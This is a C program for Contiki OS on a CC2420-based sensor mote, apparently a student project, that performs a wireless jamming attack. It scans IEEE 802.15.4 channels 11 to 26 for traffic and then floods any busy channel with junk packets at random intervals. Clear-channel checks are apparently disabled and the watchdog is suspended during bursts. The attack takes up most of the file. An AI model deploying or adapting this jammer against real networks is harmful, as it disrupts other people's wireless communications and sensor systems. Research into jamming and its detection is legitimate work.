
/**
 * \file
 *         Program for jamming a specific channel
 * \author
 *         Malthe Tøttrup <201907882@post.au.dk>
 * 
 *         $ make TARGET=sky distclean 
 *         $ make TARGET=sky MOTES=/dev/ttyUSB0 jammer_random.upload login
 */

#include "contiki.h"
#include <stdio.h> /* For printf() */
#include <math.h>
#include <os/dev/radio.h>  
#include "net/nullnet/nullnet.h"
#include "net/netstack.h"
#include <string.h>
#include <stdbool.h>
#include "sys/log.h"
#include "cc2420.h"
#include <stdlib.h>
#include "dev/watchdog.h"
#include "sys/energest.h"

#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO
#define CLOCK_MS CLOCK_SECOND/1000
#define SEND_INTERVAL (2 * CLOCK_MS) //2 ms
#define JAMMER_PACKET_LEN 120


static int current_channel = 11;

typedef struct{
     char data[JAMMER_PACKET_LEN];
}jpacket_t;

/*---------------------------------------------------------------------------*/
PROCESS(jammer, "jammer process");
AUTOSTART_PROCESSES(&jammer);
/*---------------------------------------------------------------------------*/

int abs(a){
    if(a < 0){
        return -1*a;
    }
    else {
        return a;
    }
}


bool check_channel_activity(){
    int channel_activity = 0;
    for (int i = 0; i < 25000; i++){
        NETSTACK_RADIO.on();
        channel_activity += NETSTACK_RADIO.channel_clear();     //returns 0 if channel is busy and 1 if its clear
        NETSTACK_RADIO.off();
    }
    printf("channel activity result: %d \n", channel_activity);

    if(channel_activity != 25000){
        printf("Activity found on channel %d! \n", current_channel);
        return true; 
    }
    else {
        printf("No activity found on channel %d. \n", current_channel);
        return false;
    }
}





PROCESS_THREAD(jammer, ev, data)
{   
    PROCESS_BEGIN();
    printf("Starting jamming attack\n");

    NETSTACK_RADIO.on();
    //NETSTACK_RADIO.set_value(RADIO_PARAM_CCA_THRESHOLD, 0); //turning CCA off (https://sourceforge.net/p/contiki/mailman/message/34745886/)
    
    //Hopefully this turns CCA off...
    NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);

    //Connect to the desired channel
    if(NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, channel) != RADIO_RESULT_OK) 
    {
        printf("failed channel set");
    }
    NETSTACK_RADIO.off();

    cc2420_set_channel(channel);
    
    jpacket_t jpacket;
    memset(&jpacket, 0, sizeof(jpacket_t));
    
    strcpy(jpacket.data, "Antonio Gonga is taking down your network.");
    

    static int random_interval = 0;
    static int wait_time = 0;
    static int send_time = 0;
    
    static struct etimer et;
    etimer_set(&et, CLOCK_SECOND);
    srand(128);
    
    printf("VALUE = %ld\n", CLOCK_SECOND);

    //send a packet at random times between 0-2 seconds
    while(1) {

        // Check if current_channel is active
        // If not active, we go to next channel and try again
        if (!check_channel_activity())
        {   
            // Cycle to next current_channel
            // current_channel = (current_channel >= 26) ? 11 : current_channel++;
            if (current_channel >= 26) {
                current_channel = 11;
            } else {
                current_channel++;
            }
            cc2420_set_channel(current_channel);
            // Start loop again
            continue;
        }


        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
        // cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
        
        send_time = abs(rand() % (int)CLOCK_SECOND*4);
        wait_time = abs(rand() % (int)CLOCK_SECOND*3);
        if(wait_time == 0)
            wait_time = 1;
                
        watchdog_stop();
        while(random_interval <= send_time){
            NETSTACK_RADIO.on();
            cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
            NETSTACK_RADIO.off();
            //NETSTACK_RADIO.send((void*)&jpacket, JAMMER_PACKET_LEN);
            random_interval++;
        }
        watchdog_start();
        random_interval = 0;

    
        //printf("wait_time: %d\n", wait_time);
        etimer_set(&et, wait_time);
        etimer_reset(&et);
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/
